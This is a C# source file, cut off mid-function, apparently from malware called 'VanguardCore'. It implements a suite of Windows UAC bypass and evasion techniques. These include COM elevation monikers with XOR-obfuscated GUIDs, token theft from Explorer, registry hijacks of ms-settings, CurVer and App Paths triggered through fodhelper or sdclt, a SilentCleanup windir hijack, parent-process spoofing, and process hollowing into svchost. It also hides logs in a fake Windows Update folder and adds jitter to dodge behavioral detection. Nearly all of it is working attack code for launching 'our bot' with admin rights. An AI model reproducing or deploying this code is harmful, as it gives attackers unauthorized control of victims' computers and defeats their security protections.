using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Collections.Generic;
using Microsoft.Win32;

namespace VanguardCore
{
    public class ElevationService
    {
        private static class Native
        {
            [DllImport("ole32.dll", CharSet = CharSet.Unicode, PreserveSig = true)]
            public static extern int CoGetObject(string pszName, [In] ref BIND_OPTS3 pBindOptions, [In] ref Guid riid, out IntPtr ppv);

            [DllImport("advapi32.dll", SetLastError = true)]
            public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

            [DllImport("advapi32.dll", SetLastError = true)]
            public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);

            [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
            public static extern bool CreateProcessAsUser(IntPtr hToken, string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr attribute, ref IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

            [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
            public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

            [DllImport("advapi32.dll", SetLastError = true)]
            public static extern bool SetTokenInformation(IntPtr TokenHandle, int TokenInformationClass, ref uint TokenInformation, uint TokenInformationLength);

            [DllImport("ole32.dll", SetLastError = true)]
            public static extern int CoInitializeEx(IntPtr pvReserved, uint dwCoInit);

            [DllImport("ole32.dll", SetLastError = true)]
            public static extern int CoInitializeSecurity(IntPtr pSecDesc, int cAuthSvc, IntPtr asAuthSvc, IntPtr pReserved1, uint dwAuthnLevel, uint dwImpLevel, IntPtr pReserved2, uint dwCapabilities, IntPtr pReserved3);

            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern bool CloseHandle(IntPtr hObject);

            [DllImport("user32.dll")]
            public static extern IntPtr GetForegroundWindow();

            [DllImport("user32.dll")]
            public static extern bool GetCursorPos(out POINT lpPoint);

            [StructLayout(LayoutKind.Sequential)]
            public struct POINT { public int X; public int Y; }
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo;
            public IntPtr lpAttributeList;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct STARTUPINFO
        {
            public int cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public int dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
            public short wShowWindow, cbReserved2;
            public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_INFORMATION
        {
            public IntPtr hProcess, hThread;
            public int dwProcessId, dwThreadId;
        }

        private const uint PROCESS_QUERY_INFORMATION = 0x0400;
        private const uint PROCESS_VM_READ = 0x0010;
        private const uint TOKEN_DUPLICATE  = 0x0002;
        private const uint TOKEN_QUERY      = 0x0008;
        private const uint TOKEN_ASSIGN_PRIMARY = 0x0001;
        private const uint TOKEN_ALL_ACCESS = 0x000F01FF;
        private const int  SecurityImpersonation = 2;
        private const int  TokenPrimary = 1;
        private const uint CREATE_NO_WINDOW = 0x08000000;
        private const uint CREATE_SUSPENDED = 0x00000004;

        private const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
        private const uint PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020002;

        [StructLayout(LayoutKind.Sequential)]
        private struct BIND_OPTS3
        {
            public uint cbStruct;
            public uint dwTickCountDeadline;
            public uint dwFlags;
            public uint dwMode;
            public uint dwClassContext;
            public uint locale;
            public IntPtr pServerInfo;
            public IntPtr hwnd;
        }

        // ----- COM method 1: ICMLuaUtil (CMSTP proxy) -----
        private static readonly byte[] CLSID_CMSTP_ENC = { 0x36, 0x40, 0x30, 0x43, 0x46, 0x32, 0x43, 0x3c, 0x28, 0x3c, 0x32, 0x36, 0x30, 0x28, 0x31, 0x47, 0x31, 0x32, 0x28, 0x3c, 0x3d, 0x47, 0x32, 0x28, 0x3c, 0x34, 0x35, 0x41, 0x36, 0x35, 0x30, 0x34, 0x3c, 0x32, 0x31, 0x47 };
        private static readonly byte[] IID_ICMLuaUtil_ENC = { 0x33, 0x40, 0x41, 0x41, 0x33, 0x41, 0x32, 0x31, 0x28, 0x46, 0x35, 0x35, 0x32, 0x28, 0x31, 0x40, 0x32, 0x30, 0x28, 0x47, 0x32, 0x33, 0x44, 0x28, 0x40, 0x30, 0x32, 0x31, 0x35, 0x3c, 0x3c, 0x30, 0x40, 0x37, 0x31, 0x46 };

        // ----- COM method 2: IColorDataProxy -----
        private static readonly byte[] CLSID_ColorDataProxy_ENC = { 0x47, 0x37, 0x47, 0x40, 0x46, 0x3c, 0x37, 0x34, 0x28, 0x46, 0x32, 0x43, 0x46, 0x28, 0x31, 0x43, 0x33, 0x35, 0x28, 0x3d, 0x35, 0x34, 0x37, 0x28, 0x31, 0x47, 0x31, 0x31, 0x34, 0x47, 0x34, 0x43, 0x36, 0x31, 0x33, 0x30 };
        private static readonly byte[] IID_IColorDataProxy_ENC = { 0x35, 0x44, 0x34, 0x37, 0x44, 0x30, 0x31, 0x37, 0x28, 0x40, 0x41, 0x31, 0x37, 0x28, 0x31, 0x44, 0x33, 0x36, 0x28, 0x3d, 0x43, 0x47, 0x32, 0x28, 0x43, 0x34, 0x36, 0x30, 0x44, 0x3c, 0x46, 0x35, 0x3c, 0x41, 0x36, 0x40 };

        // ----- COM method 3: IFwCplLua -----
        private static readonly byte[] CLSID_FwCplLua_ENC = { 0x40, 0x46, 0x3c, 0x3d, 0x31, 0x33, 0x47, 0x36, 0x28, 0x37, 0x32, 0x33, 0x37, 0x28, 0x31, 0x36, 0x32, 0x31, 0x28, 0x3d, 0x47, 0x36, 0x31, 0x28, 0x32, 0x37, 0x31, 0x3d, 0x33, 0x41, 0x47, 0x3c, 0x43, 0x40, 0x40, 0x31 };
        private static readonly byte[] IID_IFwCplLua_ENC = { 0x3d, 0x40, 0x47, 0x36, 0x41, 0x31, 0x43, 0x3c, 0x28, 0x36, 0x3d, 0x33, 0x31, 0x28, 0x31, 0x43, 0x35, 0x44, 0x28, 0x3c, 0x31, 0x37, 0x34, 0x28, 0x31, 0x47, 0x36, 0x41, 0x30, 0x33, 0x43, 0x3c, 0x46, 0x44, 0x35, 0x43 };

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool IsWow64Process(IntPtr hProcess, out bool lpSystemInfo);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool GetTokenInformation(IntPtr TokenHandle, int TokenInformationClass, IntPtr TokenInformation, uint TokenInformationLength, out uint ReturnLength);

        private static string DecryptGUID(byte[] enc)
        {
            char[] c = new char[enc.Length];
            for (int i = 0; i < enc.Length; i++) c[i] = (char)(enc[i] ^ 0x05);
            return new string(c).Trim('\0', ' ', '\t', '\n', '\r');
        }

        private static string BuildMonikerV2()
        {
            // "Elevation:Administrator!new:{3E5FC7F9-9735-4B47-98B7-910D3051974B}"
            byte[] prefix = { 0x45, 0x6c, 0x65, 0x76, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x3a, 0x41, 0x64, 0x6d, 0x69, 0x6e, 0x69, 0x73, 0x74, 0x72, 0x61, 0x74, 0x6f, 0x72, 0x21, 0x6e, 0x65, 0x77, 0x3a };
            string guid = DecryptGUID(CLSID_CMSTP_ENC);
            return System.Text.Encoding.ASCII.GetString(prefix) + "{" + guid + "}";
        }

        // Hide logs in a place that looks natural for Windows update activity
        private static readonly string _logPath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            "Microsoft", "Windows", "Update", "svc_debug.log");

        private static void Log(string message)
        {
            try 
            {
                string dir = Path.GetDirectoryName(_logPath);
                if (!Directory.Exists(dir)) Directory.CreateDirectory(dir);
                File.AppendAllText(_logPath, $"{DateTime.Now}: [UAC] {message}\n"); 
            }
            catch { }
        }

        public static bool IsInjected()
        {
            return Environment.CommandLine.Contains("--injected");
        }

        public static bool IsAdmin()
        {
            try
            {
                using var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
                return new System.Security.Principal.WindowsPrincipal(identity)
                    .IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
            }
            catch { return false; }
        }

        #region Bypass Methods

        /// <summary>
        /// Method A: ICMLuaUtil elevation moniker (CMSTP proxy).
        /// Zero registry footprint, fully in-memory COM call.
        /// </summary>
        private static unsafe bool BypassCmluaUtil(string payloadPath, string args, string evName)
        {
            try
            {
                Log("V6 Stage 5: ICMLuaUtil V2...");
                string moniker = BuildMonikerV2();
                Guid iid = new Guid(DecryptGUID(IID_ICMLuaUtil_ENC));
                
                BIND_OPTS3 ops = new BIND_OPTS3();
                ops.cbStruct = (uint)Marshal.SizeOf<BIND_OPTS3>();
                ops.dwClassContext = 4; // CLSCTX_LOCAL_SERVER

                // Forced COM Security for NativeAOT
                Native.CoInitializeEx(IntPtr.Zero, 0x2);

                int hr = Native.CoGetObject(moniker, ref ops, ref iid, out IntPtr pIface);
                if (hr != 0)
                {
                    Log($"Method A CoGetObject: 0x{hr:X8}");
                    
                    // FALLBACK: Try without Elevation prefix if restricted
                    string rawMoniker = "new:{" + DecryptGUID(CLSID_CMSTP_ENC) + "}";
                    hr = Native.CoGetObject(rawMoniker, ref ops, ref iid, out IntPtr pIfaceRaw);
                    if (hr != 0) return false;
                    pIface = pIfaceRaw;
                }

                IntPtr vtbl = Marshal.ReadIntPtr(pIface);
                // VTable offset probing
                for (int vtblOffset = 9; vtblOffset <= 13; vtblOffset++)
                {
                    try
                    {
                        var shellExec = (delegate* unmanaged[Stdcall]<IntPtr, char*, char*, char*, uint, uint, int>)
                            Marshal.ReadIntPtr(vtbl, vtblOffset * IntPtr.Size);
                        fixed (char* pFile = payloadPath)
                        fixed (char* pArgs = args)
                        {
                            int r = shellExec(pIface, pFile, pArgs, null, 0, 0);
                            if (r == 0) { Marshal.Release(pIface); Log($"Method A OK (offset {vtblOffset})"); return true; }
                        }
                    }
                    catch { }
                }
                Marshal.Release(pIface);
                return false;
            }
            catch (Exception ex) { Log("Method A ex: " + ex.Message); return false; }
        }

        /// <summary>
        /// Method B: IColorDataProxy LaunchDccw (Display Color Calibration auto-elevated proxy).
        /// Zero disk/registry footprint. Uses fixed VTable offset 15.
        /// </summary>
        private static unsafe bool BypassColorDataProxy(string payloadPath, string args, string evName)
        {
            try
            {
                Log("Method B: IColorDataProxy (Offset 15)...");
                BIND_OPTS3 ops = new BIND_OPTS3
                {
                    cbStruct = (uint)Marshal.SizeOf<BIND_OPTS3>(),
                    dwClassContext = 4
                };
                string moniker = "Elevation:Administrator!new:{" + DecryptGUID(CLSID_ColorDataProxy_ENC) + "}";
                Guid iid = new Guid(DecryptGUID(IID_IColorDataProxy_ENC));
                int hr = Native.CoGetObject(moniker, ref ops, ref iid, out IntPtr pIface);
                if (hr != 0) { Log($"Method B CoGetObject: 0x{hr:X8}"); return false; }

                IntPtr vtbl = Marshal.ReadIntPtr(pIface);
                string cmd = $"cmd.exe /c start \"\" \"{payloadPath}\" {args}";
                
                // User provided fixed offset 15
                var launchDccw = (delegate* unmanaged[Stdcall]<IntPtr, char*, int>)
                    Marshal.ReadIntPtr(vtbl, 15 * IntPtr.Size);
                
                fixed (char* pCmd = cmd)
                {
                    int r = launchDccw(pIface, pCmd);
                    if (r == 0) { Marshal.Release(pIface); Log("Method B OK (offset 15)"); return true; }
                }

                Marshal.Release(pIface);
                return false;
            }
            catch (Exception ex) { Log("Method B ex: " + ex.Message); return false; }
        }

        /// <summary>
        /// Method E: Tokenvator (Explorer Token Theft).
        /// Steals a token from a high-integrity process (Explorer) to spawn elevated child.
        /// </summary>
        private static bool BypassTokenvator(string payloadPath, string args)
        {
            IntPtr hToken = IntPtr.Zero;
            IntPtr hNewToken = IntPtr.Zero;
            IntPtr hProcess = IntPtr.Zero;

            try
            {
                Log("Method E: Tokenvator (Explorer Token Theft)...");
                var explorer = Process.GetProcessesByName("explorer");
                if (explorer.Length == 0) return false;

                hProcess = Native.OpenProcess(0x1000 /* PROCESS_QUERY_LIMITED_INFORMATION */ | 0x0400 /* PROCESS_QUERY_INFORMATION */, false, explorer[0].Id);
                if (hProcess == IntPtr.Zero) return false;

                if (!Native.OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY, out hToken))
                    return false;

                if (!Native.DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, IntPtr.Zero, SecurityImpersonation, TokenPrimary, out hNewToken))
                    return false;

                STARTUPINFO si = new STARTUPINFO();
                si.cb = Marshal.SizeOf<STARTUPINFO>();
                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

                string cmdLine = $"\"{payloadPath}\" {args}";
                if (Native.CreateProcessAsUser(hNewToken, null, cmdLine, IntPtr.Zero, IntPtr.Zero, false, CREATE_NO_WINDOW, IntPtr.Zero, null, ref si, out pi))
                {
                    Log("Method E OK (Process Spawned)");
                    Native.CloseHandle(pi.hProcess);
                    Native.CloseHandle(pi.hThread);
                    return true;
                }
                return false;
            }
            catch (Exception ex) { Log("Method E ex: " + ex.Message); return false; }
            finally
            {
                if (hToken != IntPtr.Zero) Native.CloseHandle(hToken);
                if (hNewToken != IntPtr.Zero) Native.CloseHandle(hNewToken);
                if (hProcess != IntPtr.Zero) Native.CloseHandle(hProcess);
            }
        }

        /// <summary>
        /// Method C: IFwCplLua (Windows Firewall Control Panel proxy).
        /// Newer auto-elevated COM server.
        /// </summary>
        private static unsafe bool BypassFwCplLua(string payloadPath, string args)
        {
            try
            {
                Log("Method C: IFwCplLua...");
                BIND_OPTS3 ops = new BIND_OPTS3
                {
                    cbStruct = (uint)Marshal.SizeOf<BIND_OPTS3>(),
                    dwClassContext = 4
                };
                string moniker = "Elevation:Administrator!new:{" + DecryptGUID(CLSID_FwCplLua_ENC) + "}";
                Guid iid = new Guid(DecryptGUID(IID_IFwCplLua_ENC));
                int hr = Native.CoGetObject(moniker, ref ops, ref iid, out IntPtr pIface);
                if (hr != 0) { Log($"Method C CoGetObject: 0x{hr:X8}"); return false; }

                IntPtr vtbl = Marshal.ReadIntPtr(pIface);
                string dir = Path.GetDirectoryName(payloadPath) ?? "";
                for (int vtblOffset = 3; vtblOffset <= 6; vtblOffset++)
                {
                    try
                    {
                        var shellExec = (delegate* unmanaged[Stdcall]<IntPtr, char*, char*, char*, uint, int>)
                            Marshal.ReadIntPtr(vtbl, vtblOffset * IntPtr.Size);
                        fixed (char* pFile = payloadPath)
                        fixed (char* pArgs = args)
                        fixed (char* pDir = dir)
                        {
                            int r = shellExec(pIface, pFile, pArgs, pDir, 0);
                            if (r == 0) { Marshal.Release(pIface); Log($"Method C OK (offset {vtblOffset})"); return true; }
                        }
                    }
                    catch { }
                }
                Marshal.Release(pIface);
                return false;
            }
            catch (Exception ex) { Log("Method C ex: " + ex.Message); return false; }
        }

        // ----- COM method 4: [REMOVED] -----

        /// <summary>
        /// Method G: MsSettings DelegateExecute (Registry Hijack).
        /// Highly effective on Win10/11. Includes jitter and robust cleanup.
        /// </summary>
        public static bool BypassMsSettingsDelegate(string payloadPath, string args)
        {
            string keyPath = @"Software\Classes\ms-settings\shell\open\command";
            bool success = false;
            try
            {
                Log("Method G: MsSettings (Stealth mode)...");
                
                // Jitter to break behavioral signatures
                Random rnd = new Random();
                Thread.Sleep(rnd.Next(1000, 3000));

                string evName = $"Global\\{Guid.NewGuid():B}";
                string childArgs = $"--uac-child --event={evName} --rnd={Guid.NewGuid().ToString().Substring(0, 6)}";

                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(keyPath))
                {
                    if (key != null)
                    {
                        key.SetValue("", $"\"{payloadPath}\" {childArgs}");
                        key.SetValue("DelegateExecute", "", RegistryValueKind.String);
                    }
                }

                Thread.Sleep(rnd.Next(500, 1500));
                
                // Trigger via sdclt.exe (Silent Backup trigger)
                string trigger = SafetyManager.GetSecret("MS_TRIGGER") ?? "sdclt.exe";
                
                Process.Start(new ProcessStartInfo { 
                    FileName = trigger, 
                    Arguments = "/kickoffgui", 
                    UseShellExecute = true, 
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                });

                success = WaitForAdminSuccess(10000, evName);
            }
            catch (Exception ex) { Log("Method G ex: " + ex.Message); }
            finally
            {
                // Robust cleanup
                try
                {
                    Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\ms-settings", false);
                }
                catch { }
            }
            return success;
        }

        #endregion

        #region V3 Discovery & Injection (The "Hardcore" Way)

        public static int FindTargetAdminProcess()
        {
            Log("Scanning for admin process target (V3.1)...");
            int currentPid = Process.GetCurrentProcess().Id;
            int currentSession = Process.GetCurrentProcess().SessionId;

            // Priority targets that are usually elevated and stable
            string[] topTargets = { "taskhostw.exe", "svchost.exe", "spoolsv.exe", "sihost.exe" };

            foreach (var proc in Process.GetProcesses())
            {
                try
                {
                    if (proc.Id == currentPid || proc.SessionId != currentSession) continue;
                    
                    string name = proc.ProcessName.ToLower();
                    if (name.Contains("taskhostw")) // Professional target: Task Host
                    {
                        Log($"Found Target Process (High Fidelity): {proc.ProcessName} (PID: {proc.Id})");
                        return proc.Id;
                    }
                }
                catch { }
            }

            return -1;
        }

        private static bool Is32Bit(IntPtr hProcess)
        {
            if (!IsWow64Process(hProcess, out bool isWow64)) return false;
            return isWow64; // If WoW64 is true, it's 32-bit on 64-bit OS
        }

        private static bool IsProtected(int pid)
        {
            // Simple check: if we can't open for full access even with SeDebug (implied), it's likely protected
            string name = "";
            try { name = Process.GetProcessById(pid).ProcessName.ToLower(); } catch { return true; }

            string[] blackList = { "lsass", "csrss", "winlogon", "smss", "services", "wininit" };
            foreach (var b in blackList) if (name.Contains(b)) return true;

            return false;
        }

        private static bool IsProcessElevated(int pid)
        {
            // Note: From a standard user context, OpenProcess/OpenProcessToken on Admin processes will fail.
            // Returning true for known system processes is a more reliable way to find spoofing targets.
            try {
                using var p = Process.GetProcessById(pid);
                string name = p.ProcessName.ToLower();
                string[] systemStable = { "taskhostw", "spoolsv", "lsass", "svchost", "sihost" };
                foreach (var s in systemStable) if (name.Contains(s)) return true;
                return false;
            } catch { return false; }
        }

        public static bool InjectAndBypass(string payloadPath)
        {
            try
            {
                Log("V3.1 Elevation: Starting Process Discovery...");
                
                // 1. Discovery (Name based for stability in non-admin context)
                int targetPid = FindTargetAdminProcess();
                if (targetPid == -1)
                {
                    Log("V3.1 Discovery: No suitable targets found in current session.");
                    return false;
                }

                string targetPath = "taskhostw.exe"; 
                Log($"V3.1 Injection Target identified: PID {targetPid}");
                
                // 2. Execute Hollowing / Spoofing
                if (HollowIntoNewProcess(targetPath))
                {
                    Log("V3.1 Injection: Success. Exit parent.");
                    return true; 
                }

                Log("V3.1 Injection: Failed to spawn child with PPID spoof.");
                return false;
            }
            catch (Exception ex)
            {
                Log("V3.1 Injection ex: " + ex.ToString());
                return false;
            }
        }
        private static bool HollowIntoNewProcess(string payloadPath)
        {
            try
            {
                string targetPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "svchost.exe");
                byte[] payload = File.ReadAllBytes(payloadPath);
                
                Log($"Professional Hollowing into {targetPath}...");
                if (HollowingService.RunPE(targetPath, payload))
                {
                    Log("V6.4 RunPE: Success. Image hollowed into svchost.");
                    return true;
                }
                
                Log("V6.4 RunPE: Failed. Falling back to Spoof-only.");
                return SpawnWithSpoof(payloadPath, "--injected", "taskhostw");
            }
            catch (Exception ex) { Log($"Hollowing ex: {ex.Message}"); return false; }
        }

        public static bool SpawnWithSpoof(string payloadPath, string args, string parentProcess = "explorer")
        {
            try
            {
                Log($"Spawning {payloadPath} with PPID Spoof ({parentProcess})...");
                var parents = Process.GetProcessesByName(parentProcess);
                if (parents.Length == 0) return false;

                IntPtr hParent = Native.OpenProcess(0x0080 /* PROCESS_CREATE_PROCESS */ | 0x0400 /* PROCESS_QUERY_INFORMATION */, false, parents[0].Id);
                if (hParent == IntPtr.Zero) return false;

                IntPtr lpSize = IntPtr.Zero;
                Native.InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
                IntPtr lpAttributeList = Marshal.AllocHGlobal(lpSize);
                Native.InitializeProcThreadAttributeList(lpAttributeList, 1, 0, ref lpSize);

                Native.UpdateProcThreadAttribute(lpAttributeList, 0, (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ref hParent, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);

                STARTUPINFOEX siex = new STARTUPINFOEX();
                siex.StartupInfo.cb = Marshal.SizeOf(siex);
                siex.lpAttributeList = lpAttributeList;

                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                string cmdLine = $"\"{payloadPath}\" {args}";

                bool success = Native.CreateProcess(null, cmdLine, IntPtr.Zero, IntPtr.Zero, false, EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW, IntPtr.Zero, null, ref siex, out pi);
                
                if (success)
                {
                    Native.CloseHandle(pi.hProcess);
                    Native.CloseHandle(pi.hThread);
                }

                Marshal.FreeHGlobal(lpAttributeList);
                Native.CloseHandle(hParent);
                return success;
            }
            catch (Exception ex) { Log($"Spoof ex: {ex.Message}"); return false; }
        }

        #endregion

        private static string GetRandomEventName() => $"Global\\{{{Guid.NewGuid()}}}";

        private static bool WaitForAdminSuccess(int timeoutMs, string eventName = null)
        {
            try
            {
                if (string.IsNullOrEmpty(eventName)) eventName = GetRandomEventName();
                using var ev = new EventWaitHandle(false, EventResetMode.ManualReset, eventName);
                return ev.WaitOne(timeoutMs);
            }
            catch { return false; }
        }

        public static bool RequestElevation(string payloadPath)
        {
            if (IsAdmin()) return true;

            // Stage 3.1: Recursive Parent Spoofing (Transition to System Context)
            if (!Environment.CommandLine.Contains("--spoofed"))
            {
                int targetPid = FindTargetAdminProcess();
                if (targetPid != -1)
                {
                    Log("V6 Stage 3: Transitioning to Spoofed System Context (taskhostw)...");
                    if (SpawnWithSpoof(payloadPath, "--spoofed", "taskhostw"))
                    {
                        Log("V6 Stage 3: Success. Parent exiting.");
                        return true; 
                    }
                }
            }

            // --- Below this point runs in the Spoofed Context ---

            // Stage 4: Reputation Building
            DoBehavioralReputation();

            // Stage 5: Professional COM Activation (ICMLuaUtil V2)
            string evName = $"Global\\{Guid.NewGuid():B}";
            string rndVal = Guid.NewGuid().ToString().Substring(0, 6);
            string args = $"--uac-child --event={evName} --rnd={rndVal}";
            
            Log("V6 Stage 5: ICMLuaUtil V2 Activation...");
            if (BypassCmluaUtil(payloadPath, args, evName)) return true;

            // Fallbacks (AppPaths & SilentCleanup) - prioritizing fileless methods
            if (BypassAppPaths(payloadPath, args, evName, "control.exe")) return true;
            if (BypassSilentCleanup(payloadPath, args, evName)) return true;
            if (BypassCurVer(payloadPath, args, evName, "fodhelper.exe")) return true;

            return BypassColorDataProxy(payloadPath, args, evName);
        }

        /// <summary>
        /// Method G: Fodhelper/Sdclt Registry Hijack (Universal).
        /// Replaces COM-based activation with direct Registry manipulation.
        /// </summary>
        private static bool BypassRegistry(string payloadPath, string args, string trigger = "fodhelper.exe")
        {
            try
            {
                Log($"Method G: {trigger} Registry Hijack...");
                string keyPath = @"Software\Classes\ms-settings\Shell\Open\command";
                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(keyPath))
                {
                    key.SetValue("", $"\"{payloadPath}\" {args}", RegistryValueKind.String);
                    key.SetValue("DelegateExecute", "", RegistryValueKind.String);
                }

                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), trigger),
                    UseShellExecute = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                };

                Process.Start(psi);
                bool ok = WaitForAdminSuccess(10000);
                
                // Cleanup
                try { Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\ms-settings", false); } catch { }
                
                if (ok) Log($"Method G ({trigger}) OK");
                return ok;
            }
            catch (Exception ex) { Log($"Method G ({trigger}) ex: {ex.Message}"); return false; }
        }

        /// <summary>
        /// Method H: SilentCleanup Task Hijack (Stealth V2).
        /// Uses 'Volatile Environment' to redirect a SYSTEM task.
        /// This bypasses ms-settings monitoring.
        /// </summary>
        private static bool BypassSilentCleanup(string payloadPath, string args, string evName)
        {
            try
            {
                Log("Method H: SilentCleanup Hijack (GHOST)...");
                
                string tempDir = Path.GetTempPath().TrimEnd('\\');
                string fakeWindir = $"{tempDir}\\vgc_{Guid.NewGuid():N}";
                string sys32 = Path.Combine(fakeWindir, "system32");
                Directory.CreateDirectory(sys32);
                
                // User-requested: Avoid batch files. Copying binary instead.
                string targetPath = Path.Combine(sys32, "cleanmgr.exe");
                File.Copy(payloadPath, targetPath);

                Registry.CurrentUser.OpenSubKey("Volatile Environment", true).SetValue("windir", fakeWindir);

                // 2. Trigger task
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "schtasks.exe",
                    Arguments = "/Run /TN \"\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup\" /I",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                };

                Process.Start(psi);
                bool ok = WaitForAdminSuccess(15000, evName);

                // 3. Cleanup
                Registry.CurrentUser.OpenSubKey("Volatile Environment", true).DeleteValue("windir", false);
                try { Directory.Delete(fakeWindir, true); } catch { }

                if (ok) Log("Method H OK");
                return ok;
            }
            catch (Exception ex) { Log($"Method H ex: {ex.Message}"); return false; }
        }

        /// <summary>
        /// Method I: CurVer Redirection (Stealth V3).
        /// Redirects 'ms-settings' to a custom class to hide from behavioral scanners.
        /// </summary>
        private static bool BypassCurVer(string payloadPath, string args, string evName, string trigger = "fodhelper.exe")
        {
            try
            {
                Log("Method I: CurVer Redirection (GHOST)...");
                string customClass = $"vgc_{Guid.NewGuid():N}";
                string classPath = $@"Software\Classes\{customClass}\shell\open\command";
                string curVerPath = @"Software\Classes\ms-settings\CurVer";

                // 1. Create the shadow class
                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(classPath))
                {
                    key.SetValue("", $"\"{payloadPath}\" {args}", RegistryValueKind.String);
                    key.SetValue("DelegateExecute", "", RegistryValueKind.String);
                }

                // 2. Point ms-settings to the shadow class via CurVer
                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(curVerPath))
                {
                    key.SetValue("", customClass);
                }

                // 3. Trigger via sdclt (High fidelity)
                string sysdir = Environment.GetFolderPath(Environment.SpecialFolder.System);
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = Path.Combine(sysdir, trigger),
                    Arguments = trigger == "sdclt.exe" ? "/kickoffgui" : "",
                    UseShellExecute = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                };

                Process.Start(psi);
                bool ok = WaitForAdminSuccess(12000, evName);

                // 4. Cleanup
                try { Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\ms-settings", false); } catch { }
                try { Registry.CurrentUser.DeleteSubKeyTree($@"Software\Classes\{customClass}", false); } catch { }

                if (ok) Log("Method I OK");
                return ok;
            }
            catch (Exception ex) { Log($"Method I ex: {ex.Message}"); return false; }
        }

        /// <summary>
        /// Method U: AppPaths Hijack (Universal Stealth).
        /// Redirects 'control.exe' or similar to our bot via App Paths.
        /// Bypasses ms-settings monitoring.
        /// </summary>
        private static bool BypassAppPaths(string payloadPath, string args, string evName, string target = "control.exe")
        {
            try
            {
                Log($"Method U: AppPaths Hijack ({target})...");
                string keyPath = $@"Software\Microsoft\Windows\CurrentVersion\App Paths\{target}";
                
                // 1. Create the AppPath entry
                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(keyPath))
                {
                    key.SetValue("", payloadPath, RegistryValueKind.String);
                    key.SetValue("Path", Path.GetDirectoryName(payloadPath), RegistryValueKind.String);
                }

                // 2. Trigger via ShellExecute
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = target,
                    Arguments = args,
                    UseShellExecute = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                };

                Process.Start(psi);
                bool ok = WaitForAdminSuccess(12000, evName);

                // 3. Cleanup
                try { Registry.CurrentUser.DeleteSubKeyTree(keyPath, false); } catch { }

                if (ok) Log("Method U OK");
                return ok;
            }
            catch (Exception ex) { Log($"Method U ex: {ex.Message}"); return false; }
        }

        private static void DoBehavioralReputation()
        {
            try
            {
                Log("Stage 4: Building Behavioral Reputation...");
                Random rnd = new Random();
                
                // 1. Legitimate system queries
                for (int i = 0; i < 5; i++)
                {
                    IntPtr hwnd = Native.GetForegroundWindow();
                    Native.GetCursorPos(out var pt);
